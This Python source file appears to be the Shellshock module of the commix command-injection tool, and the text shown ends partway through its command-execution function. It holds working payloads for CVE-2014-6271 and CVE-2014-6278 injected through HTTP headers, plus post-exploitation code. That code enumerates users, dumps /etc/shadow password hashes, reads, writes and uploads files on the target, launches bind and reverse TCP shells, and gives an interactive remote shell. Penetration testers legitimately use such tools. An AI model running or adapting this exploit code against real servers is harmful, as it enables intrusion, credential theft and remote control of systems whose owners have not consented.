#!/usr/bin/env python

import re
import os
import sys
import string
import random
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import http_client as _http_client
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.core.requests import tor
from src.core.requests import proxy
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.shells import bind_tcp
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.requests import headers as log_http_headers
from src.core.injections.controller import checks

readline_error = False
if settings.IS_WINDOWS:
  try:
    import readline
  except ImportError:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
else:
  try:
    import readline
    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
      import gnureadline as readline
  except ImportError:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
pass

default_user_agent = menu.options.agent

"""
This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
[1] CVE-2014-6271: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
[2] CVE-2014-6278: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
"""

# Available HTTP headers
headers = [
"User-Agent",
"Referer",
"Cookie"
]

# Available Shellshock CVEs
shellshock_cves = [
"CVE-2014-6271",
"CVE-2014-6278"
]

"""
Available shellshock payloads
"""
def shellshock_payloads(cve, attack_vector):
  if cve == shellshock_cves[0] :
    payload = "() { :; }; " + attack_vector
  elif cve == shellshock_cves[1] :
    payload = "() { _; } >_[$($())] { " + attack_vector + " } "
  else:
    pass
  return payload

"""
Shellshock bug exploitation
"""
def shellshock_exploitation(cve, cmd):
  attack_vector = " echo; " + cmd + ";"
  payload = shellshock_payloads(cve, attack_vector)
  return payload

"""
Enumeration Options
"""
def enumeration(url, cve, check_header, filename):

  #-------------------------------
  # Hostname enumeration
  #-------------------------------
  if menu.options.hostname:
    cmd = settings.HOSTNAME
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if shell:
      info_msg = "The hostname is " +  str(shell)
      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
      sys.stdout.flush()
      # Add infos to logs file. 
      output_file = open(filename, "a")
      info_msg = "The hostname is " + str(shell) + ".\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
      output_file.close()
    else:
      warn_msg = "Heuristics have failed to identify the hostname."
      print(settings.print_warning_msg(warn_msg)) 
    settings.ENUMERATION_DONE = True

  #-------------------------------
  # Retrieve system information
  #-------------------------------
  if menu.options.sys_info:
    cmd = settings.RECOGNISE_OS            
    target_os, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if target_os:
      if target_os == "Linux":
        cmd = settings.DISTRO_INFO
        distro_name, payload = cmd_exec(url, cmd, cve, check_header, filename)
        if len(distro_name) != 0:
          target_os = target_os + " (" + distro_name + ")"
        cmd = settings.RECOGNISE_HP
        target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
        if target_arch:
          info_msg = "The target operating system is " +  str(target_os) + Style.RESET_ALL  
          info_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)
          sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          info_msg = "The target operating system is " + str(target_os)
          info_msg += " and the hardware platform is " + str(target_arch) + ".\n"
          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
          output_file.close()
      else:
        info_msg = "The target operating system is " +  target_os   
        sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
        sys.stdout.flush()
        # Add infos to logs file.    
        output_file = open(filename, "a")
        info_msg = "The target operating system is " + str(target_os) + ".\n"
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
        output_file.close()
    else:
      warn_msg = "Heuristics have failed to retrieve the system information."
      print(settings.print_warning_msg(warn_msg))
    settings.ENUMERATION_DONE = True

  #-------------------------------
  # The current user enumeration
  #-------------------------------
  if menu.options.current_user:
    cmd = settings.CURRENT_USER
    cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if cu_account:
      if menu.options.is_root:
        cmd = re.findall(r"" + "\$(.*)", settings.IS_ROOT)
        cmd = ''.join(cmd).replace("(","").replace(")","")
        shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
        info_msg = "The current user is " +  str(cu_account)  
        sys.stdout.write(settings.print_bold_info_msg(info_msg))
        # Add infos to logs file.    
        output_file = open(filename, "a")
        info_msg = "The current user is " + str(cu_account)
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
        output_file.close()
        if shell:
          if shell != "0":
              sys.stdout.write(Style.BRIGHT + " and it is" +  " not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
              sys.stdout.flush()
              # Add infos to logs file.   
              output_file = open(filename, "a")
              output_file.write(" and it is not privileged.\n")
              output_file.close()
          else:
            sys.stdout.write(Style.BRIGHT + " and it is " +  Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
            sys.stdout.flush()
            # Add infos to logs file.   
            output_file = open(filename, "a")
            output_file.write(" and it is privileged.\n")
            output_file.close()
      else:
        info_msg = "The current user is " +  str(cu_account)  
        sys.stdout.write(settings.print_bold_info_msg(info_msg))
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        info_msg = "The current user is " + str(cu_account) + "\n"
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
        output_file.close()  
    else:
      warn_msg = "Heuristics have failed to identify the current user."
      print(settings.print_warning_msg(warn_msg))
    settings.ENUMERATION_DONE = True

  #-------------------------------
  # System users enumeration
  #-------------------------------
  if menu.options.users:
    cmd = settings.SYS_USERS             
    sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
    info_msg = "Fetching '" + settings.PASSWD_FILE 
    info_msg += "' to enumerate users entries. "  
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdout.flush()
    try:
      if sys_users[0] :
        sys_users = "".join(str(p) for p in sys_users).strip()
        if len(sys_users.split(" ")) <= 1 :
          sys_users = sys_users.split("\n")
        else:
          sys_users = sys_users.split(" ")
        # Check for appropriate '/etc/passwd' format.
        if len(sys_users) % 3 != 0 :
          sys.stdout.write(settings.FAIL_STATUS)
          sys.stdout.flush()
          warn_msg = "It seems that '" + settings.PASSWD_FILE 
          warn_msg += "' file is not in the appropriate format. Thus, it is expoted as a text file." 
          print("\n" + settings.print_warning_msg(warn_msg)) 
          sys_users = " ".join(str(p) for p in sys_users).strip()
          print(sys_users)
          output_file = open(filename, "a")
          output_file.write("      " + sys_users)
          output_file.close()
        else:  
          sys_users_list = []
          for user in range(0, len(sys_users), 3):
             sys_users_list.append(sys_users[user : user + 3])
          if len(sys_users_list) != 0 :
            sys.stdout.write(settings.SUCCESS_STATUS)
            info_msg = "Identified " + str(len(sys_users_list)) 
            info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
            info_msg += " in '" +  settings.PASSWD_FILE + "'.\n"
            sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
            sys.stdout.flush()
            # Add infos to logs file.   
            output_file = open(filename, "a")
            output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
            output_file.close()
            count = 0
            for user in range(0, len(sys_users_list)):
              sys_users = sys_users_list[user]
              sys_users = ":".join(str(p) for p in sys_users)
              count = count + 1
              fields = sys_users.split(":")
              fields1 = "".join(str(p) for p in fields)
              # System users privileges enumeration
              try:
                if not fields[2].startswith("/"):
                  raise ValueError()
                if menu.options.privileges:
                  if int(fields[1]) == 0:
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
                    is_privileged_nh = " is root user "
                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
                    is_privileged_nh = " is system user "
                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
                      is_privileged_nh = " is anonymous user "
                    elif int(fields[1]) == 60002:
                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
                      is_privileged_nh = " is non-trusted user "   
                    else:
                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
                      is_privileged_nh = " is regular user "
                  else :
                    is_privileged = ""
                    is_privileged_nh = ""
                else :
                  is_privileged = ""
                  is_privileged_nh = ""
                print("    (" +str(count)+ ") '" + Style.BRIGHT +  fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
                # Add infos to logs file.   
                output_file = open(filename, "a")
                output_file.write("    (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
                output_file.close()
              except ValueError:
                if count == 1 :
                  warn_msg = "It seems that '" + settings.PASSWD_FILE 
                  warn_msg += "' file is not in the appropriate format. "
                  warn_msg += "Thus, it is expoted as a text file." 
                  print(settings.print_warning_msg(warn_msg)) 
                sys_users = " ".join(str(p) for p in sys_users.split(":"))
                print(sys_users)
                output_file = open(filename, "a")
                output_file.write("      " + sys_users)
                output_file.close()
      else:
        sys.stdout.write(settings.FAIL_STATUS)
        sys.stdout.flush()
        warn_msg = "It seems that you don't have permissions to read '" 
        warn_msg += settings.PASSWD_FILE + "' to enumerate users entries."
        print("\n" + settings.print_warning_msg(warn_msg))   
    except TypeError:
      sys.stdout.write(settings.FAIL_STATUS + "\n")
      sys.stdout.flush()
      pass

    except IndexError:
      sys.stdout.write(settings.FAIL_STATUS)
      warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
      sys.stdout.flush()
      pass
    settings.ENUMERATION_DONE = True

  #-------------------------------------
  # System password enumeration
  #-------------------------------------
  if menu.options.passwords:
    cmd = settings.SYS_PASSES            
    sys_passes, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if sys_passes :
      sys_passes = "".join(str(p) for p in sys_passes)
      sys_passes = sys_passes.replace(" ", "\n")
      sys_passes = sys_passes.split( )
      if len(sys_passes) != 0 :
        info_msg = "Fetching '" + settings.SHADOW_FILE 
        info_msg += "' to enumerate users password hashes. "  
        sys.stdout.write(settings.print_info_msg(info_msg))
        sys.stdout.flush()
        sys.stdout.write(settings.SUCCESS_STATUS)
        info_msg = "Identified " + str(len(sys_passes))
        info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
        info_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
        sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
        output_file.close()
        count = 0
        for line in sys_passes:
          count = count + 1
          try:
            if ":" in line:
              fields = line.split(":")
              if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
                print("    (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1] + Style.RESET_ALL)
                # Add infos to logs file.   
                output_file = open(filename, "a")
                output_file.write("    (" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
                output_file.close()
          # Check for appropriate (/etc/shadow) format
          except IndexError:
            if count == 1 :
              warn_msg = "It seems that '" + settings.SHADOW_FILE 
              warn_msg += "' file is not in the appropriate format. "
              warn_msg += "Thus, it is expoted as a text file."
              sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
            print(fields[0])
            output_file = open(filename, "a")
            output_file.write("      " + fields[0])
            output_file.close()
      else:
        warn_msg = "It seems that you don't have permissions to read '"
        warn_msg += settings.SHADOW_FILE + "' to enumerate users password hashes."
        print(settings.print_warning_msg(warn_msg))
    settings.ENUMERATION_DONE = True  

"""
File Access Options
"""
def file_access(url, cve, check_header, filename):

  #-------------------------------------
  # Write to a file on the target host.
  #-------------------------------------
  if menu.options.file_write:
    file_to_write = menu.options.file_write
    if not os.path.exists(file_to_write):
      warn_msg = "It seems that the provided local file '" + file_to_write + "', does not exist."
      sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
      sys.stdout.flush()
      raise SystemExit()
      
    if os.path.isfile(file_to_write):
      with open(file_to_write, 'r') as content_file:
        content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", " ") for line in content_file]
      content = "".join(str(p) for p in content).replace("'", "\"")
    else:
      warn_msg = "It seems that '" + file_to_write + "' is not a file."
      sys.stdout.write(settings.print_warning_msg(warn_msg))
      sys.stdout.flush()
    settings.FILE_ACCESS_DONE = True

    #-------------------------------
    # Check the file-destination
    #-------------------------------
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
    else:
      dest_to_write = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    
    # Check if file exists!
    cmd = "ls " + dest_to_write + ""
    # Check if defined cookie injection.
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if shell:
      info_msg = "The " +  shell + Style.RESET_ALL 
      info_msg += Style.BRIGHT + " file was created successfully!"  
      sys.stdout.write(settings.print_bold_info_msg(info_msg))
      sys.stdout.flush()
    else:
      warn_msg = "It seems that you don't have permissions to write the '"
      warn_msg += dest_to_write + "' file." + "\n"
      sys.stdout.write(settings.print_warning_msg(warn_msg))
      sys.stdout.flush()
    settings.FILE_ACCESS_DONE = True

  #-------------------------------------
  # Upload a file on the target host.
  #-------------------------------------
  if menu.options.file_upload:
    file_to_upload = menu.options.file_upload
    # check if remote file exists.
    try:
      _urllib.request.urlopen(file_to_upload, timeout=settings.TIMEOUT)
    except _urllib.error.HTTPError as warn_msg:
      warn_msg = "It seems that the '" + file_to_upload + "' file, "
      warn_msg += "does not exist. (" + str(warn_msg) + ")\n"
      sys.stdout.write(settings.print_critical_msg(warn_msg))
      sys.stdout.flush()
      raise SystemExit()
    except ValueError as err_msg:
      err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
      sys.stdout.write(settings.print_critical_msg(err_msg) + "\n")
      sys.stdout.flush()
      raise SystemExit() 

    # Check the file-destination
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
    else:
      dest_to_upload = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    shell = "".join(str(p) for p in shell)
    
    # Check if file exists!
    cmd = "ls " + dest_to_upload
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    shell = "".join(str(p) for p in shell)
    if shell:
      info_msg = "The " +  shell 
      info_msg += Style.RESET_ALL + Style.BRIGHT 
      info_msg += " file was uploaded successfully!\n"
      sys.stdout.write(settings.print_bold_info_msg(info_msg))
      sys.stdout.flush()
    else:
      warn_msg = "It seems that you don't have permissions "
      warn_msg += "to write the '" + dest_to_upload + "' file.\n"
      sys.stdout.write(settings.print_warning_msg(warn_msg))
      sys.stdout.flush()
    settings.FILE_ACCESS_DONE = True

  #-------------------------------------
  # Read a file from the target host.
  #-------------------------------------
  if menu.options.file_read:
    file_to_read = menu.options.file_read
    # Execute command
    cmd = "cat " + settings.FILE_READ + file_to_read
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if shell:
      info_msg = "The contents of file '"  
      info_msg += file_to_read + "'" + Style.RESET_ALL + ": "  
      sys.stdout.write(settings.print_bold_info_msg(info_msg))
      sys.stdout.flush()
      print(shell)
      output_file = open(filename, "a")
      info_msg = "The contents of file '"
      info_msg += file_to_read + "' : " + shell + ".\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
      output_file.close()
    else:
      warn_msg = "It seems that you don't have permissions "
      warn_msg += "to read the '" + file_to_read + "' file.\n"
      sys.stdout.write(settings.print_warning_msg(warn_msg))
      sys.stdout.flush()
    settings.FILE_ACCESS_DONE = True

  if settings.FILE_ACCESS_DONE == True:
    print("")

"""
Execute the bind / reverse TCP shell
"""
def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):

  shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
  if settings.VERBOSITY_LEVEL != 0:
    print("")

  err_msg = "The " + os_shell_option.split("_")[0] + " "
  err_msg += os_shell_option.split("_")[1].upper() + " connection has failed."
  print(settings.print_critical_msg(err_msg))

"""
Configure the bind TCP shell
"""
def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):

  settings.BIND_TCP = True
  # Set up RHOST / LPORT for the bind TCP connection.
  bind_tcp.configure_bind_tcp(separator = "")

  if settings.BIND_TCP == False:
    if settings.REVERSE_TCP == True:
      os_shell_option = "reverse_tcp"
      reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
    return go_back, go_back_again

  while True:
    if settings.RHOST and settings.LPORT in settings.SHELL_OPTIONS:
      result = checks.check_bind_tcp_options(settings.RHOST)

    else:  
      cmd = bind_tcp.bind_tcp_options(separator = "")
      result = checks.check_bind_tcp_options(cmd)
    if result != None:
      if result == 0:
        return False
      elif result == 1 or result == 2:
        go_back_again = True
        settings.BIND_TCP = False
      return go_back, go_back_again

    # execute bind TCP shell 
    execute_shell(url, cmd, cve, check_header, filename, os_shell_option)

"""
Configure the reverse TCP shell
"""
def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):

  settings.REVERSE_TCP = True
  # Set up LHOST / LPORT for the reverse TCP connection.
  reverse_tcp.configure_reverse_tcp(separator = "")

  if settings.REVERSE_TCP == False:
    if settings.BIND_TCP == True:
      os_shell_option = "bind_tcp"
      bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
    return go_back, go_back_again

  while True:
    if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
      result = checks.check_reverse_tcp_options(settings.LHOST)
    else:  
      cmd = reverse_tcp.reverse_tcp_options(separator = "")
      result = checks.check_reverse_tcp_options(cmd)
    if result != None:
      if result == 0:
        return False
      elif result == 1 or result == 2:
        go_back_again = True
        settings.REVERSE_TCP = False
      return go_back, go_back_again

    # execute bind TCP shell 
    execute_shell(url, cmd, cve, check_header, filename, os_shell_option)

"""
Check commix shell options
"""
def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):

  if os_shell_option == False:
    if no_result == True:
      return False
    else:
      return True 

  # The "back" option
  elif os_shell_option == "back":
    go_back = True
    return go_back, go_back_again

  # The "os_shell" option
  elif os_shell_option == "os_shell": 
    warn_msg = "You are already into the '" + os_shell_option + "' mode."
    print(settings.print_warning_msg(warn_msg))+ "\n"

  # The "bind_tcp" option
  elif os_shell_option == "bind_tcp":
    go_back, go_back_again = bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
    return go_back, go_back_again

  # The "reverse_tcp" option
  elif os_shell_option == "reverse_tcp":
    go_back, go_back_again = reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
    return go_back, go_back_again

  # The "quit" option
  elif os_shell_option == "quit":                    
    raise SystemExit()

"""
The main shellshock handler
"""
def shellshock_handler(url, http_request_method, filename):

  counter = 1
  vp_flag = True
  no_result = True
  export_injection_info = False

  injection_type = "results-based command injection"
  technique = "shellshock injection technique"

  info_msg = "Testing the " + technique + ". "
  if settings.VERBOSITY_LEVEL >= 2:
    info_msg = info_msg + "\n"
  sys.stdout.write(settings.print_info_msg(info_msg))
  sys.stdout.flush()

  try: 
    i = 0
    total = len(shellshock_cves) * len(headers)
    for cve in shellshock_cves:
      for check_header in headers:
        # Check injection state
        settings.DETECTION_PHASE = True
        settings.EXPLOITATION_PHASE = False
        i = i + 1
        attack_vector = "echo " + cve + ":Done;"
        payload = shellshock_payloads(cve, attack_vector)

        # Check if defined "--verbose" option.
        if settings.VERBOSITY_LEVEL == 1:
          sys.stdout.write("\n" + settings.print_payload(payload))
        elif settings.VERBOSITY_LEVEL >= 2:
          debug_msg = "Generating payload for the injection."
          print(settings.print_debug_msg(debug_msg))
          print(settings.print_payload(payload))

        header = {check_header : payload}
        request = _urllib.request.Request(url, None, header)
        if check_header == "User-Agent":
          menu.options.agent = payload
        else:
          menu.options.agent = default_user_agent  
        log_http_headers.do_check(request)
        log_http_headers.check_http_traffic(request)
        # Check if defined any HTTP Proxy.
        if menu.options.proxy:
          response = proxy.use_proxy(request)
        # Check if defined Tor.
        elif menu.options.tor:
          response = tor.use_tor(request)
        else:
          response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
        percent = ((i*100)/total)
        float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))

        if str(float_percent) == "100.0":
          if no_result == True:
            percent = settings.FAIL_STATUS
          else:
            percent = settings.info_msg
            no_result = False

        elif len(response.info()) > 0 and cve in response.info():
          percent = settings.info_msg
          no_result = False

        else:
          percent = str(float_percent)+ "%"

        if settings.VERBOSITY_LEVEL == 0:
          info_msg = "Testing the " + technique + "." + "" + percent + ""
          sys.stdout.write("\r" + settings.print_info_msg(info_msg))
          sys.stdout.flush()

        if no_result == False:
          # Check injection state
          settings.DETECTION_PHASE = False
          settings.EXPLOITATION_PHASE = True
          # Print the findings to log file.
          if export_injection_info == False:
            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
          
          vuln_parameter = "HTTP Header"
          the_type = " " + vuln_parameter
          check_header = " " + check_header
          vp_flag = logs.add_parameter(vp_flag, filename, the_type, check_header, http_request_method, vuln_parameter, payload)
          check_header = check_header[1:]
          logs.update_payload(filename, counter, payload) 

          if settings.VERBOSITY_LEVEL != 0:
            checks.total_of_requests()

          info_msg = "The (" + check_header + ") '"
          info_msg += url + Style.RESET_ALL + Style.BRIGHT 
          info_msg += "' seems vulnerable via " + technique + "."
          if settings.VERBOSITY_LEVEL < 2:
            print("")
          print(settings.print_bold_info_msg(info_msg))
          sub_content = "\"" + payload + "\""
          print(settings.print_sub_content(sub_content))

          # Enumeration options.
          if settings.ENUMERATION_DONE == True :
            if settings.VERBOSITY_LEVEL != 0:
              print("")
            while True:
              if not menu.options.batch:
                question_msg = "Do you want to enumerate again? [Y/n] > "
                enumerate_again = _input(settings.print_question_msg(question_msg))

              else:
                 enumerate_again = "" 
              if len(enumerate_again) == 0:
                 enumerate_again = "Y"
              if enumerate_again in settings.CHOICE_YES:
                enumeration(url, cve, check_header, filename)
                break
              elif enumerate_again in settings.CHOICE_NO: 
                break
              elif enumerate_again in settings.CHOICE_QUIT:
                raise SystemExit()
              else:
                err_msg = "'" + enumerate_again + "' is not a valid answer."  
                print(settings.print_error_msg(err_msg))
                pass
          else:
            enumeration(url, cve, check_header, filename)

          # File access options.
          if settings.FILE_ACCESS_DONE == True :
            while True:
              if not menu.options.batch:
                question_msg = "Do you want to access files again? [Y/n] > "
                file_access_again = _input(settings.print_question_msg(question_msg))
              else:
                 file_access_again= "" 
              if len(file_access_again) == 0:
                 file_access_again = "Y"
              if file_access_again in settings.CHOICE_YES:
                file_access(url, cve, check_header, filename)
                break
              elif file_access_again in settings.CHOICE_NO: 
                break
              elif file_access_again in settings.CHOICE_QUIT:
                raise SystemExit()
              else:
                err_msg = "'" + file_access_again  + "' is not a valid answer."  
                print(settings.print_error_msg(err_msg))
                pass
          else:
            file_access(url, cve, check_header, filename)

          if menu.options.os_cmd:
            cmd = menu.options.os_cmd 
            shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
            print("\n") + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL 
            raise SystemExit()

          else:
            # Pseudo-Terminal shell
            print("")
            go_back = False
            go_back_again = False
            while True:
              if go_back == True:
                break
              if not menu.options.batch:
                question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
                gotshell = _input(settings.print_question_msg(question_msg))
              else:
                gotshell= ""  
              if len(gotshell) == 0:
                 gotshell= "Y"
              if gotshell in settings.CHOICE_YES:
                if not menu.options.batch:
                  print("")
                print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
                if readline_error:
                  checks.no_readline_module()
                while True:
                  try:
                    if not readline_error:
                      # Tab compliter
                      readline.set_completer(menu.tab_completer)
                      # MacOSX tab compliter
                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
                        readline.parse_and_bind("bind ^I rl_complete")
                      # Unix tab compliter
                      else:
                        readline.parse_and_bind("tab: complete")
                    cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                    cmd = checks.escaped_cmd(cmd)
                    
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                      go_back, go_back_again = check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)

                      if go_back:
                        break
                    else: 
                      shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
                      if shell != "":
                        # Update logs with executed cmds and execution results.
                        logs.executed_command(filename, cmd, shell)
                        print("\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n")
                      else:
                        debug_msg = "Executing the '" + cmd + "' command. "
                        if settings.VERBOSITY_LEVEL == 1:
                          sys.stdout.write(settings.print_debug_msg(debug_msg))
                          sys.stdout.flush()
                          sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
                        elif settings.VERBOSITY_LEVEL >= 2:
                          sys.stdout.write(settings.print_debug_msg(debug_msg))
                          sys.stdout.flush()
                          sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
                        err_msg = "The '" + cmd + "' command, does not return any output."
                        print(settings.print_critical_msg(err_msg) + "\n")

                  except KeyboardInterrupt:
                    raise

                  except SystemExit:
                    raise

                  except EOFError:
                    err_msg = "Exiting, due to EOFError."
                    print(settings.print_error_msg(err_msg))
                    raise

                  except TypeError:
                    break
                    
              elif gotshell in settings.CHOICE_NO:
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    return True 

              elif gotshell in settings.CHOICE_QUIT:
                raise SystemExit()

              else:
                err_msg = "'" + gotshell + "' is not a valid answer."  
                print(settings.print_error_msg(err_msg))
                continue
              break
        else:
          continue
          
    if no_result:
      if settings.VERBOSITY_LEVEL != 2:
        print("")
      err_msg = "All tested HTTP headers appear to be not injectable."
      print(settings.print_critical_msg(err_msg))
      raise SystemExit()
      
  except _urllib.error.HTTPError as err_msg:
    if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
      response = False  
    elif settings.IGNORE_ERR_MSG == False:
      err = str(err_msg) + "."
      print("\n" + settings.print_critical_msg(err))
      continue_tests = checks.continue_tests(err_msg)
      if continue_tests == True:
        settings.IGNORE_ERR_MSG = True
      else:
        raise SystemExit()

  except _urllib.error.URLError as err_msg:
    err_msg = str(err_msg.reason).split(" ")[2:]
    err_msg = ' '.join(err_msg)+ "."
    if settings.VERBOSITY_LEVEL != 0 and settings.LOAD_SESSION == False:
      print("")
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

  except _http_client.IncompleteRead as err_msg:
    print(settings.print_critical_msg(err_msg + "."))
    raise SystemExit()  
    
"""
Execute user commands
"""
def cmd_exec(url, cmd, cve, check_header, filename):
 
  """
  Check for shellshock 'shell'
  """
  def check_for_shell(url, cmd, cve, check_header, filename):
    try:

      TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
      cmd = "echo " + TAG + "$(" + cmd + ")" + TAG
      payload = shellshock_exploitation(cve, cmd)
      debug_msg = "Executing the '" + cmd + "' command. "
      if settings.VERBOSITY_LEVEL != 0:
        sys.stdout.write(settings.print_debug_msg(debug_msg))
      sys.stdout.flush()
      if settings.VERBOSITY_LEVEL != 0:
        sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")

      header = {check_header : payload}
      request = _urllib.request.Request(url, None, header)
      if check_header == "User-Agent":
        menu.options.agent = payload
      else:
        menu.options.agent = default_user_agent
      log_http_headers.do_check(request)
      log_http_headers.check_http_traffic(request)
      # Check if defined any HTTP Proxy.
